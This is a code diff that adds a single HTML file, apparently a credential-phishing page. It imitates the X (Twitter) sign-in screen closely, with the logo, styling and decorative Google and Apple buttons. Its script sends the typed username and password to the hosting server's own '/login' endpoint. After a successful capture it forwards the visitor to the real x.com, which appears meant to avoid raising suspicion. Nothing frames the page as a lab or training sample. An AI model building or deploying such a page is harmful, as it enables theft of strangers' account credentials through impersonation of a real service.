@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="fa" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to X</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: sans-serif;
+        }
+
+        body {
+            background-color: #000;
+            color: #e7e9ea;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .login-container {
+            width: 600px;
+            max-width: 100%;
+            padding: 20px;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .logo svg {
+            width: 40px;
+            fill: #fff;
+        }
+
+        .login-box h1 {
+            font-size: 31px;
+            font-weight: 700;
+            margin-bottom: 30px;
+        }
+
+        .oauth-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            margin-bottom: 20px;
+        }
+
+        .oauth-button {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            background-color: #000;
+            color: #fff;
+            border: 1px solid #536471;
+            border-radius: 9999px;
+            padding: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .oauth-button:hover {
+            background-color: rgba(239, 243, 244, 0.1);
+        }
+
+        .oauth-icon {
+            position: absolute;
+            left: 16px;
+            font-size: 18px;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #71767b;
+            font-size: 15px;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background-color: #2f3336;
+        }
+
+        .divider-text {
+            padding: 0 16px;
+        }
+
+        .login-form {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .form-input {
+            background-color: #000;
+            border: 1px solid #536471;
+            border-radius: 4px;
+            padding: 16px;
+            color: #e7e9ea;
+            font-size: 17px;
+            transition: border-color 0.2s;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #1d9bf0;
+        }
+
+        .login-button {
+            background-color: #fff;
+            color: #0f1419;
+            border: none;
+            border-radius: 9999px;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.2s;
+        }
+
+        .login-button:hover {
+            background-color: #d7dbdc;
+        }
+
+        .links {
+            text-align: center;
+            margin-top: 40px;
+        }
+
+        .footer-link {
+            color: #1d9bf0;
+            text-decoration: none;
+            font-size: 13px;
+        }
+
+        .footer-link:hover {
+            text-decoration: underline;
+        }
+
+        .signup-link {
+            color: #71767b;
+            margin-top: 60px;
+            font-size: 15px;
+        }
+
+        .signup-link a {
+            color: #1d9bf0;
+            text-decoration: none;
+        }
+
+        .signup-link a:hover {
+            text-decoration: underline;
+        }
+
+        .error-message {
+            color: #f4212e;
+            font-size: 13px;
+            margin-top: 4px;
+            display: none;
+        }
+
+        .success-message {
+            color: #00ba7c;
+            font-size: 13px;
+            margin-top: 10px;
+            text-align: center;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <svg viewBox="0 0 24 24" aria-hidden="true">
+                <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
+            </svg>
+        </div>
+
+        <div class="login-box">
+            <h1>Sign in to X</h1>
+
+            <div class="oauth-buttons">
+                <button class="oauth-button" type="button">
+                    <i class="fab fa-google oauth-icon"></i>
+                    Sign in with Google
+                </button>
+                <button class="oauth-button" type="button">
+                    <i class="fab fa-apple oauth-icon"></i>
+                    Sign in with Apple
+                </button>
+            </div>
+
+            <div class="divider">
+                <span class="divider-text">or</span>
+            </div>
+
+            <form class="login-form" id="loginForm" action="/login" method="POST">
+                <input type="text" class="form-input" id="username" name="username" placeholder="Username, email address or phone number" required>
+                <div class="error-message" id="usernameError">Please enter a valid username or email</div>
+
+                <input type="password" class="form-input" id="password" name="password" placeholder="Password" required>
+                <div class="error-message" id="passwordError">Please enter your password</div>
+
+                <button type="submit" class="login-button">Sign in</button>
+                <div class="success-message" id="successMessage">Login successful! Redirecting...</div>
+            </form>
+
+            <div class="links">
+                <a href="#" class="footer-link">Forgot password?</a>
+            </div>
+
+            <div class="signup-link">
+                <span>Don't have an account? <a href="#">Sign up</a></span>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const loginForm = document.getElementById('loginForm');
+            const usernameInput = document.getElementById('username');
+            const passwordInput = document.getElementById('password');
+            const usernameError = document.getElementById('usernameError');
+            const passwordError = document.getElementById('passwordError');
+            const successMessage = document.getElementById('successMessage');
+
+            loginForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                let isValid = true;
+
+                usernameError.style.display = 'none';
+                passwordError.style.display = 'none';
+                successMessage.style.display = 'none';
+
+                if (!usernameInput.value.trim()) {
+                    usernameError.style.display = 'block';
+                    isValid = false;
+                }
+
+                if (!passwordInput.value) {
+                    passwordError.style.display = 'block';
+                    isValid = false;
+                }
+
+                if (isValid) {
+                    const formData = new FormData(loginForm);
+
+                    fetch('/login', {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.status === 'success') {
+                            successMessage.style.display = 'block';
+                            loginForm.reset();
+                            setTimeout(() => {
+                                window.location.href = 'https://x.com';
+                            }, 2000);
+                        } else {
+                            alert('Login failed: ' + data.message);
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error:', error);
+                        alert('An error occurred. Please try again.');
+                    });
+                }
+            });
+
+            usernameInput.addEventListener('input', function() {
+                if (this.value.trim()) {
+                    usernameError.style.display = 'none';
+                }
+            });
+
+            passwordInput.addEventListener('input', function() {
+                if (this.value) {
+                    passwordError.style.display = 'none';
+                }
+            });
+        });
+    </script>
+</body>
+</html>
